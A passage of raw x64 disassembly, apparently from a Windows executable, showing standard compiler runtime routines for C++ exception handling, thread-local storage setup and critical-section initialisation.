   140003afb:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003b00:	48 0f ba e0 13       	bt     $0x13,%rax
   140003b05:	73 09                	jae    0x140003b10
   140003b07:	48 0f ba 35 58 a5 01 	btrq   $0x7,0x1a558(%rip)        # 0x14001e068
   140003b0e:	00 07 
   140003b10:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140003b15:	33 c0                	xor    %eax,%eax
   140003b17:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140003b1c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003b21:	48 83 c4 10          	add    $0x10,%rsp
   140003b25:	5f                   	pop    %rdi
   140003b26:	c3                   	ret
   140003b27:	cc                   	int3
   140003b28:	33 c0                	xor    %eax,%eax
   140003b2a:	39 05 78 bb 01 00    	cmp    %eax,0x1bb78(%rip)        # 0x14001f6a8
   140003b30:	0f 95 c0             	setne  %al
   140003b33:	c3                   	ret
   140003b34:	cc                   	int3
   140003b35:	cc                   	int3
   140003b36:	cc                   	int3
   140003b37:	cc                   	int3
   140003b38:	cc                   	int3
   140003b39:	cc                   	int3
   140003b3a:	cc                   	int3
   140003b3b:	cc                   	int3
   140003b3c:	cc                   	int3
   140003b3d:	cc                   	int3
   140003b3e:	cc                   	int3
   140003b3f:	cc                   	int3
   140003b40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003b45:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003b4a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003b4f:	57                   	push   %rdi
   140003b50:	41 54                	push   %r12
   140003b52:	41 55                	push   %r13
   140003b54:	41 56                	push   %r14
   140003b56:	41 57                	push   %r15
   140003b58:	48 83 ec 40          	sub    $0x40,%rsp
   140003b5c:	48 8b e9             	mov    %rcx,%rbp
   140003b5f:	4d 8b f9             	mov    %r9,%r15
   140003b62:	49 8b c8             	mov    %r8,%rcx
   140003b65:	49 8b f0             	mov    %r8,%rsi
   140003b68:	4c 8b ea             	mov    %rdx,%r13
   140003b6b:	e8 14 04 00 00       	call   0x140003f84
   140003b70:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140003b74:	4d 8b 37             	mov    (%r15),%r14
   140003b77:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   140003b7b:	4d 2b f4             	sub    %r12,%r14
   140003b7e:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   140003b82:	41 8b 7f 48          	mov    0x48(%r15),%edi
   140003b86:	0f 85 e5 00 00 00    	jne    0x140003c71
   140003b8c:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003b91:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140003b96:	e9 c2 00 00 00       	jmp    0x140003c5d
   140003b9b:	8b f7                	mov    %edi,%esi
   140003b9d:	48 03 f6             	add    %rsi,%rsi
   140003ba0:	8b 44 f3 04          	mov    0x4(%rbx,%rsi,8),%eax
   140003ba4:	4c 3b f0             	cmp    %rax,%r14
   140003ba7:	0f 82 ae 00 00 00    	jb     0x140003c5b
   140003bad:	8b 44 f3 08          	mov    0x8(%rbx,%rsi,8),%eax
   140003bb1:	4c 3b f0             	cmp    %rax,%r14
   140003bb4:	0f 83 a1 00 00 00    	jae    0x140003c5b
   140003bba:	83 7c f3 10 00       	cmpl   $0x0,0x10(%rbx,%rsi,8)
   140003bbf:	0f 84 96 00 00 00    	je     0x140003c5b
   140003bc5:	83 7c f3 0c 01       	cmpl   $0x1,0xc(%rbx,%rsi,8)
   140003bca:	74 1b                	je     0x140003be7
   140003bcc:	8b 44 f3 0c          	mov    0xc(%rbx,%rsi,8),%eax
   140003bd0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003bd5:	49 03 c4             	add    %r12,%rax
   140003bd8:	49 8b d5             	mov    %r13,%rdx
   140003bdb:	ff d0                	call   *%rax
   140003bdd:	85 c0                	test   %eax,%eax
   140003bdf:	0f 88 85 00 00 00    	js     0x140003c6a
   140003be5:	7e 74                	jle    0x140003c5b
   140003be7:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   140003bee:	75 28                	jne    0x140003c18
   140003bf0:	48 83 3d 08 d2 00 00 	cmpq   $0x0,0xd208(%rip)        # 0x140010e00
   140003bf7:	00 
   140003bf8:	74 1e                	je     0x140003c18
   140003bfa:	48 8d 0d ff d1 00 00 	lea    0xd1ff(%rip),%rcx        # 0x140010e00
   140003c01:	e8 ca ab 00 00       	call   0x14000e7d0
   140003c06:	85 c0                	test   %eax,%eax
   140003c08:	74 0e                	je     0x140003c18
   140003c0a:	ba 01 00 00 00       	mov    $0x1,%edx
   140003c0f:	48 8b cd             	mov    %rbp,%rcx
   140003c12:	ff 15 e8 d1 00 00    	call   *0xd1e8(%rip)        # 0x140010e00
   140003c18:	8b 4c f3 10          	mov    0x10(%rbx,%rsi,8),%ecx
   140003c1c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003c22:	49 03 cc             	add    %r12,%rcx
   140003c25:	49 8b d5             	mov    %r13,%rdx
   140003c28:	e8 23 03 00 00       	call   0x140003f50
   140003c2d:	49 8b 47 40          	mov    0x40(%r15),%rax
   140003c31:	4c 8b c5             	mov    %rbp,%r8
   140003c34:	8b 54 f3 10          	mov    0x10(%rbx,%rsi,8),%edx
   140003c38:	49 8b cd             	mov    %r13,%rcx
   140003c3b:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   140003c3f:	49 03 d4             	add    %r12,%rdx
   140003c42:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003c47:	49 8b 47 28          	mov    0x28(%r15),%rax
   140003c4b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003c50:	ff 15 3a c4 00 00    	call   *0xc43a(%rip)        # 0x140010090
   140003c56:	e8 25 03 00 00       	call   0x140003f80
   140003c5b:	ff c7                	inc    %edi
   140003c5d:	3b 3b                	cmp    (%rbx),%edi
   140003c5f:	0f 82 36 ff ff ff    	jb     0x140003b9b
   140003c65:	e9 b8 00 00 00       	jmp    0x140003d22
   140003c6a:	33 c0                	xor    %eax,%eax
   140003c6c:	e9 b6 00 00 00       	jmp    0x140003d27
   140003c71:	8b 13                	mov    (%rbx),%edx
   140003c73:	3b fa                	cmp    %edx,%edi
   140003c75:	0f 83 a7 00 00 00    	jae    0x140003d22
   140003c7b:	49 8b 77 20          	mov    0x20(%r15),%rsi
   140003c7f:	49 2b f4             	sub    %r12,%rsi
   140003c82:	8b cf                	mov    %edi,%ecx
   140003c84:	48 03 c9             	add    %rcx,%rcx
   140003c87:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140003c8b:	4c 3b f0             	cmp    %rax,%r14
   140003c8e:	0f 82 82 00 00 00    	jb     0x140003d16
   140003c94:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140003c98:	4c 3b f0             	cmp    %rax,%r14
   140003c9b:	73 79                	jae    0x140003d16
   140003c9d:	44 8b 55 04          	mov    0x4(%rbp),%r10d
   140003ca1:	41 83 e2 20          	and    $0x20,%r10d
   140003ca5:	74 44                	je     0x140003ceb
   140003ca7:	45 33 c9             	xor    %r9d,%r9d
   140003caa:	85 d2                	test   %edx,%edx
   140003cac:	74 38                	je     0x140003ce6
   140003cae:	45 8b c1             	mov    %r9d,%r8d
   140003cb1:	4d 03 c0             	add    %r8,%r8
   140003cb4:	42 8b 44 c3 04       	mov    0x4(%rbx,%r8,8),%eax
   140003cb9:	48 3b f0             	cmp    %rax,%rsi
   140003cbc:	72 20                	jb     0x140003cde
   140003cbe:	42 8b 44 c3 08       	mov    0x8(%rbx,%r8,8),%eax
   140003cc3:	48 3b f0             	cmp    %rax,%rsi
   140003cc6:	73 16                	jae    0x140003cde
   140003cc8:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   140003ccc:	42 39 44 c3 10       	cmp    %eax,0x10(%rbx,%r8,8)
   140003cd1:	75 0b                	jne    0x140003cde
   140003cd3:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   140003cd7:	42 39 44 c3 0c       	cmp    %eax,0xc(%rbx,%r8,8)
   140003cdc:	74 08                	je     0x140003ce6
   140003cde:	41 ff c1             	inc    %r9d
   140003ce1:	44 3b ca             	cmp    %edx,%r9d
   140003ce4:	72 c8                	jb     0x140003cae
   140003ce6:	44 3b 0b             	cmp    (%rbx),%r9d
   140003ce9:	75 37                	jne    0x140003d22
   140003ceb:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   140003cef:	85 c0                	test   %eax,%eax
   140003cf1:	74 0c                	je     0x140003cff
   140003cf3:	48 3b f0             	cmp    %rax,%rsi
   140003cf6:	75 1e                	jne    0x140003d16
   140003cf8:	45 85 d2             	test   %r10d,%r10d
   140003cfb:	75 25                	jne    0x140003d22
   140003cfd:	eb 17                	jmp    0x140003d16
   140003cff:	8d 47 01             	lea    0x1(%rdi),%eax
   140003d02:	49 8b d5             	mov    %r13,%rdx
   140003d05:	41 89 47 48          	mov    %eax,0x48(%r15)
   140003d09:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140003d0e:	b1 01                	mov    $0x1,%cl
   140003d10:	4d 03 c4             	add    %r12,%r8
   140003d13:	41 ff d0             	call   *%r8
   140003d16:	8b 13                	mov    (%rbx),%edx
   140003d18:	ff c7                	inc    %edi
   140003d1a:	3b fa                	cmp    %edx,%edi
   140003d1c:	0f 82 60 ff ff ff    	jb     0x140003c82
   140003d22:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d27:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140003d2c:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140003d30:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140003d34:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140003d38:	49 8b e3             	mov    %r11,%rsp
   140003d3b:	41 5f                	pop    %r15
   140003d3d:	41 5e                	pop    %r14
   140003d3f:	41 5d                	pop    %r13
   140003d41:	41 5c                	pop    %r12
   140003d43:	5f                   	pop    %rdi
   140003d44:	c3                   	ret
   140003d45:	cc                   	int3
   140003d46:	cc                   	int3
   140003d47:	cc                   	int3
   140003d48:	48 83 ec 28          	sub    $0x28,%rsp
   140003d4c:	e8 db 03 00 00       	call   0x14000412c
   140003d51:	84 c0                	test   %al,%al
   140003d53:	75 04                	jne    0x140003d59
   140003d55:	32 c0                	xor    %al,%al
   140003d57:	eb 12                	jmp    0x140003d6b
   140003d59:	e8 5a 03 00 00       	call   0x1400040b8
   140003d5e:	84 c0                	test   %al,%al
   140003d60:	75 07                	jne    0x140003d69
   140003d62:	e8 0d 04 00 00       	call   0x140004174
   140003d67:	eb ec                	jmp    0x140003d55
   140003d69:	b0 01                	mov    $0x1,%al
   140003d6b:	48 83 c4 28          	add    $0x28,%rsp
   140003d6f:	c3                   	ret
   140003d70:	48 83 ec 28          	sub    $0x28,%rsp
   140003d74:	84 c9                	test   %cl,%cl
   140003d76:	75 0a                	jne    0x140003d82
   140003d78:	e8 87 03 00 00       	call   0x140004104
   140003d7d:	e8 f2 03 00 00       	call   0x140004174
   140003d82:	b0 01                	mov    $0x1,%al
   140003d84:	48 83 c4 28          	add    $0x28,%rsp
   140003d88:	c3                   	ret
   140003d89:	cc                   	int3
   140003d8a:	cc                   	int3
   140003d8b:	cc                   	int3
   140003d8c:	48 3b ca             	cmp    %rdx,%rcx
   140003d8f:	74 19                	je     0x140003daa
   140003d91:	48 83 c2 09          	add    $0x9,%rdx
   140003d95:	48 8d 41 09          	lea    0x9(%rcx),%rax
   140003d99:	48 2b d0             	sub    %rax,%rdx
   140003d9c:	8a 08                	mov    (%rax),%cl
   140003d9e:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   140003da1:	75 0a                	jne    0x140003dad
   140003da3:	48 ff c0             	inc    %rax
   140003da6:	84 c9                	test   %cl,%cl
   140003da8:	75 f2                	jne    0x140003d9c
   140003daa:	33 c0                	xor    %eax,%eax
   140003dac:	c3                   	ret
   140003dad:	1b c0                	sbb    %eax,%eax
   140003daf:	83 c8 01             	or     $0x1,%eax
   140003db2:	c3                   	ret
   140003db3:	cc                   	int3
   140003db4:	48 85 c9             	test   %rcx,%rcx
   140003db7:	74 67                	je     0x140003e20
   140003db9:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140003dbd:	48 83 ec 48          	sub    $0x48,%rsp
   140003dc1:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140003dc7:	75 53                	jne    0x140003e1c
   140003dc9:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140003dcd:	75 4d                	jne    0x140003e1c
   140003dcf:	8b 41 20             	mov    0x20(%rcx),%eax
   140003dd2:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140003dd7:	83 f8 02             	cmp    $0x2,%eax
   140003dda:	77 40                	ja     0x140003e1c
   140003ddc:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140003de0:	48 85 c0             	test   %rax,%rax
   140003de3:	74 37                	je     0x140003e1c
   140003de5:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003de9:	85 d2                	test   %edx,%edx
   140003deb:	74 11                	je     0x140003dfe
   140003ded:	48 03 51 38          	add    0x38(%rcx),%rdx
   140003df1:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140003df5:	e8 2a 00 00 00       	call   0x140003e24
   140003dfa:	eb 20                	jmp    0x140003e1c
   140003dfc:	eb 1e                	jmp    0x140003e1c
   140003dfe:	f6 00 10             	testb  $0x10,(%rax)
   140003e01:	74 19                	je     0x140003e1c
   140003e03:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140003e07:	48 8b 08             	mov    (%rax),%rcx
   140003e0a:	48 85 c9             	test   %rcx,%rcx
   140003e0d:	74 0d                	je     0x140003e1c
   140003e0f:	48 8b 01             	mov    (%rcx),%rax
   140003e12:	48 8b 40 10          	mov    0x10(%rax),%rax
   140003e16:	ff 15 74 c4 00 00    	call   *0xc474(%rip)        # 0x140010290
   140003e1c:	48 83 c4 48          	add    $0x48,%rsp
   140003e20:	c3                   	ret
   140003e21:	cc                   	int3
   140003e22:	cc                   	int3
   140003e23:	cc                   	int3
   140003e24:	48 ff e2             	rex.W jmp *%rdx
   140003e27:	cc                   	int3
   140003e28:	40 53                	rex push %rbx
   140003e2a:	48 83 ec 20          	sub    $0x20,%rsp
   140003e2e:	48 8b d9             	mov    %rcx,%rbx
   140003e31:	e8 a6 01 00 00       	call   0x140003fdc
   140003e36:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140003e3a:	eb 09                	jmp    0x140003e45
   140003e3c:	48 39 1a             	cmp    %rbx,(%rdx)
   140003e3f:	74 12                	je     0x140003e53
   140003e41:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140003e45:	48 85 d2             	test   %rdx,%rdx
   140003e48:	75 f2                	jne    0x140003e3c
   140003e4a:	8d 42 01             	lea    0x1(%rdx),%eax
   140003e4d:	48 83 c4 20          	add    $0x20,%rsp
   140003e51:	5b                   	pop    %rbx
   140003e52:	c3                   	ret
   140003e53:	33 c0                	xor    %eax,%eax
   140003e55:	eb f6                	jmp    0x140003e4d
   140003e57:	cc                   	int3
   140003e58:	4c 63 0a             	movslq (%rdx),%r9
   140003e5b:	4c 03 c9             	add    %rcx,%r9
   140003e5e:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   140003e62:	7c 17                	jl     0x140003e7b
   140003e64:	4c 63 42 04          	movslq 0x4(%rdx),%r8
   140003e68:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   140003e6c:	49 8b 04 08          	mov    (%r8,%rcx,1),%rax
   140003e70:	48 63 04 02          	movslq (%rdx,%rax,1),%rax
   140003e74:	49 03 c0             	add    %r8,%rax
   140003e77:	49 03 c1             	add    %r9,%rax
   140003e7a:	c3                   	ret
   140003e7b:	49 8b c1             	mov    %r9,%rax
   140003e7e:	c3                   	ret
   140003e7f:	cc                   	int3
   140003e80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e85:	57                   	push   %rdi
   140003e86:	48 83 ec 20          	sub    $0x20,%rsp
   140003e8a:	48 8b 39             	mov    (%rcx),%rdi
   140003e8d:	48 8b d9             	mov    %rcx,%rbx
   140003e90:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   140003e96:	74 12                	je     0x140003eaa
   140003e98:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   140003e9e:	74 0a                	je     0x140003eaa
   140003ea0:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003ea6:	74 22                	je     0x140003eca
   140003ea8:	eb 13                	jmp    0x140003ebd
   140003eaa:	e8 2d 01 00 00       	call   0x140003fdc
   140003eaf:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140003eb3:	7e 08                	jle    0x140003ebd
   140003eb5:	e8 22 01 00 00       	call   0x140003fdc
   140003eba:	ff 48 30             	decl   0x30(%rax)
   140003ebd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ec2:	33 c0                	xor    %eax,%eax
   140003ec4:	48 83 c4 20          	add    $0x20,%rsp
   140003ec8:	5f                   	pop    %rdi
   140003ec9:	c3                   	ret
   140003eca:	e8 0d 01 00 00       	call   0x140003fdc
   140003ecf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003ed3:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140003ed7:	e8 00 01 00 00       	call   0x140003fdc
   140003edc:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140003ee0:	e8 4b 33 00 00       	call   0x140007230
   140003ee5:	cc                   	int3
   140003ee6:	cc                   	int3
   140003ee7:	cc                   	int3
   140003ee8:	48 83 ec 28          	sub    $0x28,%rsp
   140003eec:	e8 eb 00 00 00       	call   0x140003fdc
   140003ef1:	48 83 c0 20          	add    $0x20,%rax
   140003ef5:	48 83 c4 28          	add    $0x28,%rsp
   140003ef9:	c3                   	ret
   140003efa:	cc                   	int3
   140003efb:	cc                   	int3
   140003efc:	48 83 ec 28          	sub    $0x28,%rsp
   140003f00:	e8 d7 00 00 00       	call   0x140003fdc
   140003f05:	48 83 c0 28          	add    $0x28,%rax
   140003f09:	48 83 c4 28          	add    $0x28,%rsp
   140003f0d:	c3                   	ret
   140003f0e:	cc                   	int3
   140003f0f:	cc                   	int3
   140003f10:	48 83 ec 28          	sub    $0x28,%rsp
   140003f14:	e8 17 33 00 00       	call   0x140007230
   140003f19:	cc                   	int3
   140003f1a:	cc                   	int3
   140003f1b:	cc                   	int3
   140003f1c:	cc                   	int3
   140003f1d:	cc                   	int3
   140003f1e:	cc                   	int3
   140003f1f:	cc                   	int3
   140003f20:	cc                   	int3
   140003f21:	cc                   	int3
   140003f22:	cc                   	int3
   140003f23:	cc                   	int3
   140003f24:	cc                   	int3
   140003f25:	cc                   	int3
   140003f26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003f2d:	00 00 00 
   140003f30:	cc                   	int3
   140003f31:	cc                   	int3
   140003f32:	cc                   	int3
   140003f33:	cc                   	int3
   140003f34:	cc                   	int3
   140003f35:	cc                   	int3
   140003f36:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003f3d:	00 00 00 
   140003f40:	cc                   	int3
   140003f41:	cc                   	int3
   140003f42:	cc                   	int3
   140003f43:	cc                   	int3
   140003f44:	cc                   	int3
   140003f45:	cc                   	int3
   140003f46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003f4d:	00 00 00 
   140003f50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003f55:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140003f5a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140003f5f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140003f66:	e9 05 00 00 00       	jmp    0x140003f70
   140003f6b:	cc                   	int3
   140003f6c:	cc                   	int3
   140003f6d:	cc                   	int3
   140003f6e:	cc                   	int3
   140003f6f:	cc                   	int3
   140003f70:	c3                   	ret
   140003f71:	cc                   	int3
   140003f72:	cc                   	int3
   140003f73:	cc                   	int3
   140003f74:	cc                   	int3
   140003f75:	cc                   	int3
   140003f76:	cc                   	int3
   140003f77:	cc                   	int3
   140003f78:	cc                   	int3
   140003f79:	cc                   	int3
   140003f7a:	cc                   	int3
   140003f7b:	cc                   	int3
   140003f7c:	cc                   	int3
   140003f7d:	cc                   	int3
   140003f7e:	cc                   	int3
   140003f7f:	cc                   	int3
   140003f80:	c3                   	ret
   140003f81:	cc                   	int3
   140003f82:	cc                   	int3
   140003f83:	cc                   	int3
   140003f84:	48 8b 05 f5 c2 00 00 	mov    0xc2f5(%rip),%rax        # 0x140010280
   140003f8b:	48 8d 15 1e f7 ff ff 	lea    -0x8e2(%rip),%rdx        # 0x1400036b0
   140003f92:	48 3b c2             	cmp    %rdx,%rax
   140003f95:	74 23                	je     0x140003fba
   140003f97:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140003f9e:	00 00 
   140003fa0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140003fa7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140003fab:	72 06                	jb     0x140003fb3
   140003fad:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140003fb1:	76 07                	jbe    0x140003fba
   140003fb3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140003fb8:	cd 29                	int    $0x29
   140003fba:	c3                   	ret
   140003fbb:	cc                   	int3
   140003fbc:	48 83 ec 28          	sub    $0x28,%rsp
   140003fc0:	48 85 c9             	test   %rcx,%rcx
   140003fc3:	74 11                	je     0x140003fd6
   140003fc5:	48 8d 05 94 ac 01 00 	lea    0x1ac94(%rip),%rax        # 0x14001ec60
   140003fcc:	48 3b c8             	cmp    %rax,%rcx
   140003fcf:	74 05                	je     0x140003fd6
   140003fd1:	e8 7a 32 00 00       	call   0x140007250
   140003fd6:	48 83 c4 28          	add    $0x28,%rsp
   140003fda:	c3                   	ret
   140003fdb:	cc                   	int3
   140003fdc:	48 83 ec 28          	sub    $0x28,%rsp
   140003fe0:	e8 13 00 00 00       	call   0x140003ff8
   140003fe5:	48 85 c0             	test   %rax,%rax
   140003fe8:	74 05                	je     0x140003fef
   140003fea:	48 83 c4 28          	add    $0x28,%rsp
   140003fee:	c3                   	ret
   140003fef:	e8 fc 32 00 00       	call   0x1400072f0
   140003ff4:	cc                   	int3
   140003ff5:	cc                   	int3
   140003ff6:	cc                   	int3
   140003ff7:	cc                   	int3
   140003ff8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ffd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004002:	57                   	push   %rdi
   140004003:	48 83 ec 20          	sub    $0x20,%rsp
   140004007:	83 3d 62 a0 01 00 ff 	cmpl   $0xffffffff,0x1a062(%rip)        # 0x14001e070
   14000400e:	75 07                	jne    0x140004017
   140004010:	33 c0                	xor    %eax,%eax
   140004012:	e9 91 00 00 00       	jmp    0x1400040a8
   140004017:	ff 15 7b c0 00 00    	call   *0xc07b(%rip)        # 0x140010098
   14000401d:	8b 0d 4d a0 01 00    	mov    0x1a04d(%rip),%ecx        # 0x14001e070
   140004023:	8b d8                	mov    %eax,%ebx
   140004025:	ff 15 85 c0 00 00    	call   *0xc085(%rip)        # 0x1400100b0
   14000402b:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000402f:	33 ff                	xor    %edi,%edi
   140004031:	48 3b c2             	cmp    %rdx,%rax
   140004034:	74 67                	je     0x14000409d
   140004036:	48 85 c0             	test   %rax,%rax
   140004039:	74 05                	je     0x140004040
   14000403b:	48 8b f8             	mov    %rax,%rdi
   14000403e:	eb 5d                	jmp    0x14000409d
   140004040:	8b 0d 2a a0 01 00    	mov    0x1a02a(%rip),%ecx        # 0x14001e070
   140004046:	ff 15 6c c0 00 00    	call   *0xc06c(%rip)        # 0x1400100b8
   14000404c:	85 c0                	test   %eax,%eax
   14000404e:	74 4d                	je     0x14000409d
   140004050:	ba 80 00 00 00       	mov    $0x80,%edx
   140004055:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140004058:	e8 f3 32 00 00       	call   0x140007350
   14000405d:	8b 0d 0d a0 01 00    	mov    0x1a00d(%rip),%ecx        # 0x14001e070
   140004063:	48 8b f0             	mov    %rax,%rsi
   140004066:	48 85 c0             	test   %rax,%rax
   140004069:	74 22                	je     0x14000408d
   14000406b:	48 8b d0             	mov    %rax,%rdx
   14000406e:	ff 15 44 c0 00 00    	call   *0xc044(%rip)        # 0x1400100b8
   140004074:	85 c0                	test   %eax,%eax
   140004076:	74 0f                	je     0x140004087
   140004078:	48 8b cf             	mov    %rdi,%rcx
   14000407b:	c7 46 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rsi)
   140004082:	48 8b fe             	mov    %rsi,%rdi
   140004085:	eb 11                	jmp    0x140004098
   140004087:	8b 0d e3 9f 01 00    	mov    0x19fe3(%rip),%ecx        # 0x14001e070
   14000408d:	33 d2                	xor    %edx,%edx
   14000408f:	ff 15 23 c0 00 00    	call   *0xc023(%rip)        # 0x1400100b8
   140004095:	48 8b ce             	mov    %rsi,%rcx
   140004098:	e8 b3 31 00 00       	call   0x140007250
   14000409d:	8b cb                	mov    %ebx,%ecx
   14000409f:	ff 15 fb bf 00 00    	call   *0xbffb(%rip)        # 0x1400100a0
   1400040a5:	48 8b c7             	mov    %rdi,%rax
   1400040a8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400040ad:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400040b2:	48 83 c4 20          	add    $0x20,%rsp
   1400040b6:	5f                   	pop    %rdi
   1400040b7:	c3                   	ret
   1400040b8:	48 83 ec 28          	sub    $0x28,%rsp
   1400040bc:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x140003fbc
   1400040c3:	ff 15 df bf 00 00    	call   *0xbfdf(%rip)        # 0x1400100a8
   1400040c9:	89 05 a1 9f 01 00    	mov    %eax,0x19fa1(%rip)        # 0x14001e070
   1400040cf:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400040d2:	74 26                	je     0x1400040fa
   1400040d4:	48 8d 15 85 ab 01 00 	lea    0x1ab85(%rip),%rdx        # 0x14001ec60
   1400040db:	8b c8                	mov    %eax,%ecx
   1400040dd:	ff 15 d5 bf 00 00    	call   *0xbfd5(%rip)        # 0x1400100b8
   1400040e3:	85 c0                	test   %eax,%eax
   1400040e5:	74 0e                	je     0x1400040f5
   1400040e7:	c7 05 e7 ab 01 00 fe 	movl   $0xfffffffe,0x1abe7(%rip)        # 0x14001ecd8
   1400040ee:	ff ff ff 
   1400040f1:	b0 01                	mov    $0x1,%al
   1400040f3:	eb 07                	jmp    0x1400040fc
   1400040f5:	e8 0a 00 00 00       	call   0x140004104
   1400040fa:	32 c0                	xor    %al,%al
   1400040fc:	48 83 c4 28          	add    $0x28,%rsp
   140004100:	c3                   	ret
   140004101:	cc                   	int3
   140004102:	cc                   	int3
   140004103:	cc                   	int3
   140004104:	48 83 ec 28          	sub    $0x28,%rsp
   140004108:	8b 0d 62 9f 01 00    	mov    0x19f62(%rip),%ecx        # 0x14001e070
   14000410e:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004111:	74 10                	je     0x140004123
   140004113:	ff 15 a7 bf 00 00    	call   *0xbfa7(%rip)        # 0x1400100c0
   140004119:	c7 05 4d 9f 01 00 ff 	movl   $0xffffffff,0x19f4d(%rip)        # 0x14001e070
   140004120:	ff ff ff 
   140004123:	b0 01                	mov    $0x1,%al
   140004125:	48 83 c4 28          	add    $0x28,%rsp
   140004129:	c3                   	ret
   14000412a:	cc                   	int3
   14000412b:	cc                   	int3
   14000412c:	40 53                	rex push %rbx
   14000412e:	48 83 ec 20          	sub    $0x20,%rsp
   140004132:	33 db                	xor    %ebx,%ebx
   140004134:	48 8d 15 a5 ab 01 00 	lea    0x1aba5(%rip),%rdx        # 0x14001ece0
   14000413b:	45 33 c0             	xor    %r8d,%r8d
   14000413e:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004142:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140004146:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000414b:	ff 15 87 bf 00 00    	call   *0xbf87(%rip)        # 0x1400100d8
   140004151:	85 c0                	test   %eax,%eax
   140004153:	74 11                	je     0x140004166
   140004155:	ff 05 ad ab 01 00    	incl   0x1abad(%rip)        # 0x14001ed08
   14000415b:	ff c3                	inc    %ebx
   14000415d:	83 fb 01             	cmp    $0x1,%ebx
   140004160:	72 d2                	jb     0x140004134
   140004162:	b0 01                	mov    $0x1,%al
   140004164:	eb 07                	jmp    0x14000416d
   140004166:	e8 09 00 00 00       	call   0x140004174
   14000416b:	32 c0                	xor    %al,%al
   14000416d:	48 83 c4 20          	add    $0x20,%rsp
   140004171:	5b                   	pop    %rbx
   140004172:	c3                   	ret
   140004173:	cc                   	int3
   140004174:	40 53                	rex push %rbx
   140004176:	48 83 ec 20          	sub    $0x20,%rsp
   14000417a:	8b 1d 88 ab 01 00    	mov    0x1ab88(%rip),%ebx        # 0x14001ed08
   140004180:	eb 1d                	jmp    0x14000419f
   140004182:	48 8d 05 57 ab 01 00 	lea    0x1ab57(%rip),%rax        # 0x14001ece0
   140004189:	ff cb                	dec    %ebx
